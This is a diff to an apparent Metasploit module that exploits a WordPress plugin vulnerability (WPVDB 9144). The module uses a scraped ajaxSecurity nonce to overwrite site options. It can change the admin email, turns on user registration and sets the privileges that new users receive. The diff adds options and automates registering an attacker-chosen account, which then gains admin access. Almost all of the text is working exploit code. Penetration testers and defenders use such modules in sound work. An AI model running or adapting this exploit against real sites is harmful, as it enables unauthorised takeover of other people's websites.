@@ -30,7 +30,16 @@ class MetasploitModule < Msf::Auxiliary
           ['WPVDB', '9144']
         ],
       'DisclosureDate'  => 'Nov 08 2018'
-      ))
+    ))
+
+    register_options [
+      OptString.new('EMAIL', [true, 'Email for registration', nil]),
+      OptString.new('USER', [true, 'Username for registration', 'msfuser'])
+    ]
+
+    register_advanced_options [
+      OptString.new('WPEMAIL', [false, 'Wordpress Administration Email (default: no email modification)', nil])
+    ]
   end
 
   def check
@@ -68,11 +77,12 @@ class MetasploitModule < Msf::Auxiliary
 
     ajax_security = wp_home_res.body[/"ajaxSecurity":"([a-zA-Z0-9]+)"/i, 1]
 
-    new_email = "#{Rex::Text.rand_text_alpha(5)}@#{Rex::Text.rand_text_alpha(5)}.com"
-    print_status("Changing admin e-mail address to #{new_email}...")
-    if set_wp_option('admin_email', new_email, ajax_security).nil?
-      print_error("Failed to change the admin e-mail address")
-      return
+    if datastore['WPEMAIL'].present? && (datastore['WPEMAIL'] =~ URI::MailTo::EMAIL_REGEXP)
+      print_warning("Changing admin e-mail address to #{datastore['WPEMAIL']}...")
+      if set_wp_option('admin_email', datastore['WPEMAIL'], ajax_security).nil?
+        print_error("Failed to change the admin e-mail address")
+        return
+      end
     end
 
     print_warning("Enabling user registrations...")
@@ -87,8 +97,8 @@ class MetasploitModule < Msf::Auxiliary
       return
     end
 
-    register_url = normalize_uri(target_uri.path, 'wp-login.php?action=register')
-    print_good("Privilege escalation complete")
-    print_good("Create a new account at #{register_url} to gain admin access.")
+    unless (datastore['EMAIL'] =~ URI::MailTo::EMAIL_REGEXP) && wordpress_register(datastore['USER'], datastore['EMAIL'])
+      print_error("Failed to register user")
+    end
   end
 end
